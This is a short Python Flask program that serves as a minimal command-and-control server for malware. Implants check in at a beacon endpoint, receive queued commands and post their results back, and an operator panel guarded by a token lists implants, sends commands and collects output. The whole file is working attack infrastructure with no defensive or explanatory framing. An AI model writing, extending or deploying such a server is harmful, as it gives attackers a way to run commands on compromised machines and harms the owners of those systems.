from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
TOKEN = "CHANGE_ME_LONG_RANDOM"

TASKS, RESULTS, IMPLANTS = {}, {}, {}

def auth(): return request.headers.get("X-Token") == TOKEN

@app.route("/beacon", methods=["POST"])
def beacon():
    iid = request.json["id"]
    IMPLANTS[iid] = datetime.datetime.now().isoformat()
    q = TASKS.get(iid)
    return jsonify({"task": q.pop(0) if q else None})

@app.route("/result", methods=["POST"])
def result():
    d = request.json
    RESULTS.setdefault(d["id"], []).append(d)
    return ("", 204)

@app.route("/panel/implants")
def panel_implants():
    if not auth(): return ("", 403)
    return jsonify(IMPLANTS)

@app.route("/panel/send", methods=["POST"])
def panel_send():
    if not auth(): return ("", 403)
    d = request.json
    TASKS.setdefault(d["id"], []).append(d["cmd"])
    return ("", 204)

@app.route("/panel/results/<iid>")
def panel_results(iid):
    if not auth(): return ("", 403)
    out = RESULTS.get(iid, [])
    RESULTS[iid] = []
    return jsonify(out)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
